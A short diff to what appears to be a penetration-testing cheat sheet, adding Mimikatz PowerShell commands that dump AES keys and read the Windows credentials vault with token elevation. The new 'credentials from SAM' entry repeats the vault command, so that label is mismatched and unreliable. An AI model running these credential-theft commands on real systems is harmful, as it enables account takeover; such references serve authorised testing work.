@@ -172,7 +172,11 @@ Get AES keys
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
-Inspect credentials vault
+Get credentials vault
+```powershell
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
+```
+Get credentials from SAM
 ```powershell
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
